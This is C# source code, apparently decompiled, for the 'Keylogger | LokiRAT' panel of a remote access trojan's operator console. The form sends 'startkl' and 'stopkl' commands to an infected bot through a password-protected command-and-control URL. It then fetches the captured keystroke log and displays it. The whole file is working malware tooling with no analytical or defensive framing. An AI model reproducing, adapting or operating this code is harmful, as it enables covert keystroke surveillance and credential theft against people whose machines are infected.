namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Windows.Forms;

    public class keylogger : Form
    {
        private ToolStripMenuItem clearLogsToolStripMenuItem;
        private IContainer components = null;
        private ToolStripMenuItem loadToolStripMenuItem;
        private MenuStrip menuStrip1;
        private string myLastCommand = "-1";
        private RichTextBox richTextBox1;
        private ToolStripMenuItem startToolStripMenuItem;
        private ToolStripMenuItem stopToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;

        public keylogger()
        {
            this.InitializeComponent();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(keylogger));
            this.richTextBox1 = new RichTextBox();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.menuStrip1 = new MenuStrip();
            this.startToolStripMenuItem = new ToolStripMenuItem();
            this.stopToolStripMenuItem = new ToolStripMenuItem();
            this.loadToolStripMenuItem = new ToolStripMenuItem();
            this.clearLogsToolStripMenuItem = new ToolStripMenuItem();
            this.menuStrip1.SuspendLayout();
            base.SuspendLayout();
            this.richTextBox1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.richTextBox1.Location = new Point(-1, 0x1b);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new Size(0x298, 0x1bb);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            this.timer1.Enabled = true;
            this.timer1.Interval = 0x3e8;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            this.menuStrip1.Items.AddRange(new ToolStripItem[] { this.startToolStripMenuItem, this.stopToolStripMenuItem, this.loadToolStripMenuItem, this.clearLogsToolStripMenuItem });
            this.menuStrip1.Location = new Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new Size(0x297, 0x18);
            this.menuStrip1.TabIndex = 5;
            this.menuStrip1.Text = "menuStrip1";
            this.startToolStripMenuItem.Image = (Image) manager.GetObject("startToolStripMenuItem.Image");
            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
            this.startToolStripMenuItem.Size = new Size(0x3b, 20);
            this.startToolStripMenuItem.Text = "Start";
            this.startToolStripMenuItem.Click += new EventHandler(this.startToolStripMenuItem_Click);
            this.stopToolStripMenuItem.Image = (Image) manager.GetObject("stopToolStripMenuItem.Image");
            this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
            this.stopToolStripMenuItem.Size = new Size(0x3b, 20);
            this.stopToolStripMenuItem.Text = "Stop";
            this.stopToolStripMenuItem.Click += new EventHandler(this.stopToolStripMenuItem_Click);
            this.loadToolStripMenuItem.Image = (Image) manager.GetObject("loadToolStripMenuItem.Image");
            this.loadToolStripMenuItem.Name = "loadToolStripMenuItem";
            this.loadToolStripMenuItem.Size = new Size(0x47, 20);
            this.loadToolStripMenuItem.Text = "Reload";
            this.loadToolStripMenuItem.Click += new EventHandler(this.loadToolStripMenuItem_Click);
            this.clearLogsToolStripMenuItem.Image = (Image) manager.GetObject("clearLogsToolStripMenuItem.Image");
            this.clearLogsToolStripMenuItem.Name = "clearLogsToolStripMenuItem";
            this.clearLogsToolStripMenuItem.Size = new Size(90, 20);
            this.clearLogsToolStripMenuItem.Text = "Clear Logs";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x297, 470);
            base.Controls.Add(this.richTextBox1);
            base.Controls.Add(this.menuStrip1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.MainMenuStrip = this.menuStrip1;
            base.Name = "keylogger";
            this.Text = "Keylogger | LokiRAT";
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        public string loadPage(string toHost)
        {
            WebClient client = new WebClient();
            string str = null;
            try
            {
                client.Headers["User-Agent"] = main.userAgent;
                str = client.DownloadString(main.connectionURL + "?pass=" + main.connectionPass + "&id=" + main.currentID + "&" + toHost);
            }
            catch
            {
                new configuration().ShowDialog();
            }
            return str;
        }

        private void loadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string str = this.loadPage("type=klview").Replace("{br}", "\n");
            this.richTextBox1.Text = str;
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadPage("type=command&command=startkl");
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadPage("type=command&command=stopkl");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    if (main.lastCommandText[main.selectedBot] == "RSstartkl")
                    {
                        MessageBox.Show("Keylogger started", "Keylogger status", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    else if (main.lastCommandText[main.selectedBot] == "RSstopkl")
                    {
                        MessageBox.Show("Keylogger stoppped!", "Keylogger status", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                }
            }
            catch
            {
            }
        }
    }
}

